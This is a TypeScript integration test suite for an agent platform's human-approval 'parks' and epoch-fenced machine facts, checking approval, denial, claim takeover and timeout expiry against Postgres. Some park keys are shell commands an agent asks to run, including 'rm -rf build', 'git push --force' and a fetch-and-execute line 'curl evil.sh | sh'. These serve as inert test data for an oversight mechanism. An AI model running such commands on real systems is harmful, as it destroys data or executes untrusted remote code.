// Durable parks and machine facts against the REAL schema (0156, machine-parks.ts, machine-facts.ts):
// facts are insert-if-absent and epoch-fenced; a park walks open → resolved (a human, a decision, a
// reply line) → wake intent → claimed at boot by a NEW epoch → done, a dead epoch's claim is taken
// over, and an expired park resolves as a timeout denial and wakes its machine.
// Run via scripts/test-pg.sh — skipped without DATABASE_URL.
import type { Actor } from '@neuramesh/shared';
import postgres from 'postgres';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createApp } from '../src/app';
import { grantCredits } from '../src/credits';
import { createCloudMachine } from '../src/fleet';
import { executeCommand } from '../src/handler';
import { pruneTickFacts, recordFact } from '../src/machine-facts';
import { parkSweep, resolveParksForReply } from '../src/machine-parks';
import { mintMachineToken } from '../src/machine-auth';
import { PostgresStore } from '../src/pgstore';

const DB = process.env['DATABASE_URL'];
// its OWN workspace (the cloudrun suite's idiom): one member machine per (workspace, owner)
const WS = 'a5a5a5a5-0000-0000-0000-00000000c4a2';
const FIXTURE_CHANNEL = 'c0000000-0000-0000-0000-00000000000b';
const george: Actor = { kind: 'human', id: '00000000-0000-0000-0000-000000000001' };
const stranger: Actor = { kind: 'human', id: '00000000-0000-0000-0000-0000000000ee' };

const store = DB ? new PostgresStore(DB) : null;
const app = store ? createApp(store) : null;
const sql = DB ? postgres(DB) : null;

const ENV = { FLEET_SECRET: 'test-fleet-secret', FLEET_CLOUDRUN: '1', CRON_SECRET: 'test-cron-secret' } as const;
const saved: Record<string, string | undefined> = {};
const fleet = { authorization: 'Bearer test-fleet-secret', 'content-type': 'application/json' };
const json = (b: unknown) => JSON.stringify(b);

let MACHINE = '';
let CREDENTIAL = '';
const tokens: Record<number, string> = {};

const call = (method: 'GET' | 'POST', path: string, token: string, body?: unknown) =>
  app!.request(path, body === undefined ? { method, headers: { authorization: `Bearer ${token}` } } : { method, headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: json(body) });
const human = (actor: Actor, path: string, body?: unknown) =>
  app!.request(path, { method: body === undefined ? 'GET' : 'POST', headers: { 'content-type': 'application/json', 'x-nm-actor': JSON.stringify(actor) }, ...(body === undefined ? {} : { body: json(body) }) });
const boot = async (): Promise<number> => {
  const res = await app!.request('/v1/machines/boot', { method: 'POST', headers: { authorization: `Bearer ${CREDENTIAL}`, 'content-type': 'application/json' }, body: '{}' });
  expect(res.status).toBe(200);
  const grant = (await res.json()) as { epoch: number; token: string };
  tokens[grant.epoch] = grant.token;
  return grant.epoch;
};
const machine = async () => (await sql!`select desired_replicas, last_wake_at, epoch from machines where id = ${MACHINE}::uuid`)[0]!;
const sleepMachine = () => sql!`update machines set desired_replicas = 0, started_at = null, last_wake_at = now() - interval '1 hour' where id = ${MACHINE}::uuid`;
const parkBody = (epoch: number, key: string, extra: Record<string, unknown> = {}) => ({
  epoch, key, kind: 'approval', question: `rex wants to run a shell command: \`${key}\` in #7. Approve?`,
  request: { toolName: 'Bash', where: { taskId: TASK } }, checkpoint: { kind: 'task', taskId: TASK, taskNumber: 7 },
  wakeCondition: { on: 'answer' }, taskId: TASK, ttlMs: 3_600_000, ...extra,
});
const TASK = '7a5a0000-0000-0000-0000-00000000c4a2';

type ParkOut = { id: string; status: string; resolution: { approved: boolean; answer: string | null; reason?: string; source: string } | null; claimedEpoch: number | null; expiresAt: string };

beforeAll(async () => {
  if (!sql) return;
  for (const [k, v] of Object.entries(ENV)) { saved[k] = process.env[k]; process.env[k] = v; }
  await sql`insert into workspaces (id, name, slug, created_by, plan) values (${WS}::uuid, 'Parks Test', 'parks-facts-test', ${george.id}::uuid, 'cloud') on conflict (id) do nothing`;
  await sql`insert into workspace_members (workspace_id, user_id, role) values (${WS}::uuid, ${george.id}::uuid, 'owner') on conflict do nothing`;
  // a resolution wakes the machine the way a message does: credits permitting
  await grantCredits(sql, WS, 100, 'manual', 'parks test');
  const { hash } = mintMachineToken();
  MACHINE = (await createCloudMachine(sql, { workspaceId: WS, kind: 'member', ownerUserId: george.id, name: 'parks-member', tokenHash: hash, substrate: 'cloudrun' })).id;
  const minted = await app!.request(`/internal/machines/${MACHINE}/boot-credential`, { method: 'POST', headers: fleet });
  CREDENTIAL = ((await minted.json()) as { credential: string }).credential;
});

afterAll(async () => {
  if (sql && MACHINE) await sql`update machines set lifecycle = 'destroyed', name = name || '-gone' where id = ${MACHINE}::uuid`.catch(() => {});
  for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  await sql?.end();
  await store?.close();
});

describe.skipIf(!DB)('machine facts on postgres (0156)', () => {
  it('insert-if-absent: the first write creates, every later one reads created:false; release gives it back', async () => {
    const e = await boot();
    const first = await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1', payload: { pr: 12 } });
    expect(first.status).toBe(201);
    expect(await first.json()).toMatchObject({ created: true, fact: { kind: 'merged', subject: 'task-1', payload: { pr: 12 }, createdByMachine: MACHINE, epoch: e, workspaceId: WS } });
    const again = await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1' });
    expect(again.status).toBe(200);
    expect(await again.json()).toMatchObject({ created: false, fact: { payload: { pr: 12 } } });
    expect(await (await call('GET', '/v1/machines/facts?kind=merged&subject=task-1', tokens[e]!)).json()).toMatchObject({ fact: { subject: 'task-1' } });
    expect(await (await call('GET', '/v1/machines/facts?kind=merged&subject=task-404', tokens[e]!)).json()).toEqual({ fact: null });
    const list = (await (await call('GET', '/v1/machines/facts?kind=merged', tokens[e]!)).json()) as { facts: Array<{ subject: string }> };
    expect(list.facts.map((f) => f.subject)).toContain('task-1');
    expect(await (await call('POST', '/v1/machines/facts/release', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1' })).json()).toEqual({ released: true });
    expect(await (await call('POST', '/v1/machines/facts/release', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1' })).json()).toEqual({ released: false });
    expect((await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1' })).status).toBe(201);
  });

  it('the epoch fence: a replaced instance records nothing; the newer epoch reads the older epoch\'s fact as handled', async () => {
    const old = Number((await machine())['epoch']);
    const e = await boot();
    expect(e).toBe(old + 1);
    // the replaced token: 409 at the bearer, before any write
    const stale = await call('POST', '/v1/machines/facts', tokens[old]!, { epoch: old, kind: 'merged', subject: 'task-stale' });
    expect(stale.status).toBe(409);
    expect(((await stale.json()) as { code: string }).code).toBe('STALE_EPOCH');
    // the current token naming an old epoch: 409 from the conditional insert
    const named = await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: old, kind: 'merged', subject: 'task-stale' });
    expect(named.status).toBe(409);
    await expect(recordFact(sql!, MACHINE, { epoch: old, kind: 'merged', subject: 'task-stale' })).rejects.toMatchObject({ code: 'STALE_EPOCH' });
    expect((await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e + 1, kind: 'merged', subject: 'task-stale' })).status).toBe(422);
    expect((await sql!`select 1 from machine_facts where workspace_id = ${WS}::uuid and subject_key = 'task-stale'`).length).toBe(0);
    // released by the old epoch only through its own machine id: the fact epoch 1 wrote is still handled
    expect(await (await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e, kind: 'merged', subject: 'task-1' })).json()).toMatchObject({ created: false });
    // a human is never the caller
    expect((await human(george, '/v1/machines/facts', { epoch: e, kind: 'merged', subject: 'x' })).status).toBe(403);
  });

  it('a sweep tick is claimed once across the workspace, and the park sweep prunes old ticks only', async () => {
    const e = Number((await machine())['epoch']);
    const tick = { epoch: e, kind: 'orch-sweep', subject: 'orch-1/ch-1/watchdog/5000' };
    expect(await (await call('POST', '/v1/machines/facts', tokens[e]!, tick)).json()).toMatchObject({ created: true });
    expect(await (await call('POST', '/v1/machines/facts', tokens[e]!, tick)).json()).toMatchObject({ created: false });
    await sql!`update machine_facts set created_at = now() - interval '2 days' where workspace_id = ${WS}::uuid and kind = 'orch-sweep'`;
    expect((await call('POST', '/v1/machines/facts', tokens[e]!, { epoch: e, kind: 'orch-sweep', subject: 'orch-1/ch-1/watchdog/5001' })).status).toBe(201);
    await sql!`update machine_facts set created_at = now() - interval '2 days' where workspace_id = ${WS}::uuid and kind = 'merged'`;
    expect(await pruneTickFacts(sql!)).toBe(1);
    const left = await sql!<{ kind: string; subject_key: string }[]>`select kind, subject_key from machine_facts where workspace_id = ${WS}::uuid and kind in ('orch-sweep', 'merged') order by kind, subject_key`;
    // the fresh tick stays, and an old already-handled fact is never a tick
    expect(left.map((r) => `${r.kind}:${r.subject_key}`)).toEqual(expect.arrayContaining(['orch-sweep:orch-1/ch-1/watchdog/5001', 'merged:task-1']));
    expect(left.some((r) => r.subject_key === 'orch-1/ch-1/watchdog/5000')).toBe(false);
  });
});

describe.skipIf(!DB)('durable parks on postgres (0156)', () => {
  let PARK = '';

  it('a park is idempotent per key and carries its TTL', async () => {
    const e = Number((await machine())['epoch']);
    const res = await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'rm -rf build'));
    expect(res.status).toBe(201);
    const made = (await res.json()) as { created: boolean; park: ParkOut };
    expect(made.park).toMatchObject({ status: 'open', resolution: null });
    expect(Date.parse(made.park.expiresAt) - Date.now()).toBeGreaterThan(3_500_000);
    PARK = made.park.id;
    const again = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'rm -rf build'))).json()) as { created: boolean; park: ParkOut };
    expect(again).toMatchObject({ created: false, park: { id: PARK } });
    const byKey = (await (await call('GET', `/v1/machines/parks?key=${encodeURIComponent('rm -rf build')}`, tokens[e]!)).json()) as { park: ParkOut };
    expect(byKey.park.id).toBe(PARK);
    const open = (await (await call('GET', '/v1/machines/parks?status=open', tokens[e]!)).json()) as { parks: ParkOut[] };
    expect(open.parks.map((p) => p.id)).toContain(PARK);
    // no TTL named: the 24 h default
    const dflt = (await (await call('POST', '/v1/machines/parks', tokens[e]!, { ...parkBody(e, 'default ttl'), ttlMs: undefined })).json()) as { park: ParkOut };
    expect(Date.parse(dflt.park.expiresAt) - Date.now()).toBeGreaterThan(23 * 3_600_000);
    // a stale epoch cannot park
    expect((await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e - 1, 'stale park'))).status).toBe(409);
  });

  it('a human resolves it while the machine sleeps: resolved, approved, and the machine is told to wake', async () => {
    await sleepMachine();
    expect((await human(stranger, `/v1/parks/${PARK}/resolve`, { answer: 'Approve' })).status).toBe(404);
    const listed = (await (await human(george, `/v1/parks?workspace=${WS}`)).json()) as { parks: ParkOut[] };
    expect(listed.parks.map((p) => p.id)).toContain(PARK);
    const res = await human(george, `/v1/parks/${PARK}/resolve`, { answer: 'Approve' });
    expect(res.status).toBe(200);
    const out = (await res.json()) as { park: ParkOut; woken: number };
    expect(out.park).toMatchObject({ status: 'resolved', resolution: { approved: true, answer: 'Approve', source: 'human' } });
    expect(out.woken).toBe(1);
    const m = await machine();
    expect(m['desired_replicas']).toBe(1);
    expect(Date.now() - new Date(m['last_wake_at'] as Date).getTime()).toBeLessThan(60_000);
    // answered once
    expect((await human(george, `/v1/parks/${PARK}/resolve`, { answer: 'Deny' })).status).toBe(409);
  });

  it('the woken machine boots a NEW epoch, claims the resolution, and finishes it; the old epoch cannot', async () => {
    const old = Number((await machine())['epoch']);
    const e = await boot();
    const claimable = (await (await call('GET', '/v1/machines/parks?status=resolved', tokens[e]!)).json()) as { parks: ParkOut[] };
    expect(claimable.parks.map((p) => p.id)).toContain(PARK);
    expect((await call('POST', `/v1/machines/parks/${PARK}/claim`, tokens[old]!, { epoch: old })).status).toBe(409);
    const claimed = await call('POST', `/v1/machines/parks/${PARK}/claim`, tokens[e]!, { epoch: e });
    expect(claimed.status).toBe(200);
    expect(((await claimed.json()) as { park: ParkOut }).park).toMatchObject({ status: 'claimed', claimedEpoch: e, resolution: { approved: true } });
    // idempotent for the epoch that holds it
    expect((await call('POST', `/v1/machines/parks/${PARK}/claim`, tokens[e]!, { epoch: e })).status).toBe(200);
    const done = await call('POST', `/v1/machines/parks/${PARK}/done`, tokens[e]!, { epoch: e });
    expect(((await done.json()) as { park: ParkOut }).park.status).toBe('done');
    expect(((await (await call('GET', '/v1/machines/parks?status=resolved', tokens[e]!)).json()) as { parks: ParkOut[] }).parks.map((p) => p.id)).not.toContain(PARK);
    // the key is free again: the next ask under it is a new park
    const next = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'rm -rf build'))).json()) as { created: boolean; park: ParkOut };
    expect(next.created).toBe(true);
    expect(next.park.id).not.toBe(PARK);
  });

  it('a reply-line answer resolves by question; a claim whose epoch died is taken over by the next boot', async () => {
    const e = Number((await machine())['epoch']);
    const made = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'git push --force'))).json()) as { park: ParkOut };
    const question = `rex wants to run a shell command: \`git push --force\` in #7. Approve?`;
    expect(await resolveParksForReply(sql!, WS, { taskId: TASK }, [[question, 'Deny']], george)).toEqual([made.park.id]);
    expect((await call('POST', `/v1/machines/parks/${made.park.id}/claim`, tokens[e]!, { epoch: e })).status).toBe(200);
    // the process dies before `done`: the next epoch sees the claim as abandoned and takes it
    const next = await boot();
    const claimable = (await (await call('GET', '/v1/machines/parks?status=resolved', tokens[next]!)).json()) as { parks: ParkOut[] };
    expect(claimable.parks.map((p) => p.id)).toContain(made.park.id);
    const taken = (await (await call('POST', `/v1/machines/parks/${made.park.id}/claim`, tokens[next]!, { epoch: next })).json()) as { park: ParkOut };
    expect(taken.park).toMatchObject({ claimedEpoch: next, resolution: { approved: false, answer: 'Deny', source: 'reply' } });
    expect(((await (await call('POST', `/v1/machines/parks/${made.park.id}/done`, tokens[next]!, { epoch: next })).json()) as { park: ParkOut }).park.status).toBe('done');
  });

  it('decision.answer resolves the park of its card', async () => {
    const e = Number((await machine())['epoch']);
    const [msg] = await sql!`insert into messages (workspace_id, channel_id, author_kind, author_id, body)
      values (${WS}::uuid, ${FIXTURE_CHANNEL}::uuid, 'agent', ${crypto.randomUUID()}::uuid, 'permission card') returning id`;
    const messageId = msg!['id'] as string;
    const [dec] = await sql!`insert into decisions (workspace_id, channel_id, message_id, asker_kind, asker_id, question, options)
      values (${WS}::uuid, ${FIXTURE_CHANNEL}::uuid, ${messageId}::uuid, 'agent', ${crypto.randomUUID()}::uuid, 'deploy?', '[{"label":"Approve"},{"label":"Deny"}]'::jsonb) returning id`;
    const made = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'deploy', { messageId, question: 'deploy?' }))).json()) as { park: ParkOut };
    await executeCommand(store!, george, { type: 'decision.answer', decisionId: dec!['id'] as string, answer: 'Approve' } as never);
    const [row] = await sql!`select status, resolution from parks where id = ${made.park.id}::uuid`;
    expect(row!['status']).toBe('resolved');
    expect(row!['resolution']).toMatchObject({ approved: true, answer: 'Approve', source: 'decision' });
  });

  it('the machine relays an answer its own session took: resolved, no wake', async () => {
    const e = Number((await machine())['epoch']);
    const made = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'code:thread:editor:abc', { kind: 'approval', taskId: null }))).json()) as { park: ParkOut };
    await sleepMachine();
    const res = await call('POST', `/v1/machines/parks/${made.park.id}/resolve`, tokens[e]!, { epoch: e, resolution: { answer: 'Approve', approved: true } });
    expect(res.status).toBe(200);
    expect(((await res.json()) as { park: ParkOut }).park).toMatchObject({ status: 'resolved', resolution: { approved: true, source: 'machine' } });
    expect((await machine())['desired_replicas']).toBe(0);
    await sql!`update machines set desired_replicas = 1 where id = ${MACHINE}::uuid`;
  });

  it('expiry: an open park past its TTL resolves as a timeout denial and wakes its machine', async () => {
    const e = Number((await machine())['epoch']);
    const made = (await (await call('POST', '/v1/machines/parks', tokens[e]!, parkBody(e, 'curl evil.sh | sh', { ttlMs: 60_000 }))).json()) as { park: ParkOut };
    await sql!`update parks set expires_at = now() - interval '1 second' where id = ${made.park.id}::uuid`;
    await sleepMachine();
    expect((await app!.request('/internal/park-sweep', { headers: { authorization: 'Bearer wrong' } })).status).toBe(403);
    const sweep = await app!.request('/internal/park-sweep', { headers: { authorization: `Bearer ${ENV.CRON_SECRET}` } });
    expect(((await sweep.json()) as { expired: string[] }).expired).toContain(made.park.id);
    expect(await parkSweep(sql!)).toMatchObject({ expired: [] });
    const [row] = await sql!`select status, resolution from parks where id = ${made.park.id}::uuid`;
    expect(row!['status']).toBe('expired');
    expect(row!['resolution']).toMatchObject({ approved: false, answer: null, reason: 'timeout', source: 'expiry' });
    expect((await machine())['desired_replicas']).toBe(1);
    const claimable = (await (await call('GET', '/v1/machines/parks?status=resolved', tokens[e]!)).json()) as { parks: ParkOut[] };
    expect(claimable.parks.map((p) => p.id)).toContain(made.park.id);
  });
});
